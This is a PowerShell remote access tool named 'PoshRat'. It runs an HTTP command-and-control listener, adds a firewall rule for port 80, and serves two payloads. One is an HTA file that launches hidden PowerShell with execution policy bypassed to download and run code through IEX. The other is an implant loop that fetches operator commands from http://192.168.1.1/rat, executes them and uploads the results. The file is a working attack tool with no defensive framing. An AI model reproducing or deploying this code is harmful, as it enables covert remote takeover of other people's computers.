function Receive-Request {
    param(      
       $Request
    )
    $output = ""
    $size = $Request.ContentLength64 + 1   
    $buffer = New-Object byte[] $size
    do {
       $count = $Request.InputStream.Read($buffer, 0, $size)
       $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
    } until($count -lt $size)
    $Request.InputStream.Close()
    write-host $output
 }
 
 $listener = New-Object System.Net.HttpListener
 $listener.Prefixes.Add('http://+:80/') 
 
 netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
 netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
 
 $listener.Start()
 'Listening ...'
 while ($true) {
     $context = $listener.GetContext() # blocks until request is received
     $request = $context.Request
     $response = $context.Response
     $hostip = $request.RemoteEndPoint
     #Use this for One-Liner Start
     if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
      write-host "Host Connected" -fore Cyan
         $message = '
                     $s = "http://192.168.1.1/rat"
                     $w = New-Object Net.WebClient 
                     while($true)
                     {
                         $r = $w.DownloadString("$s")
                         while($r) {
                             $o = invoke-expression $r | out-string 
                             $w.UploadString("$s", $o)	
                             break
                         }
                     }
         '
 
     }		 
     
     if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
         Receive-Request($request)	
     }
     if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
         $response.ContentType = 'text/plain'
         $message = Read-Host "PS $hostip>"		
     }
     if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) {
         $enc = [system.Text.Encoding]::UTF8
         $response.ContentType = 'application/hta'
         $htacode = '<html>
                       <head>
                         <script>
                         var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring(''http://192.168.1.1/connect''))\"\"";
                         new ActiveXObject(''WScript.Shell'').Run(c);
                         </script>
                       </head>
                       <body>
                       <script>self.close();
                       </body>
                     </html>'
         
         $buffer = $enc.GetBytes($htacode)		
         $response.ContentLength64 = $buffer.length
         $output = $response.OutputStream
         $output.Write($buffer, 0, $buffer.length)
         $output.Close()
         continue
     }
     
 
     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
     $response.ContentLength64 = $buffer.length
     $output = $response.OutputStream
     $output.Write($buffer, 0, $buffer.length)
     $output.Close()
}

$listener.Stop()
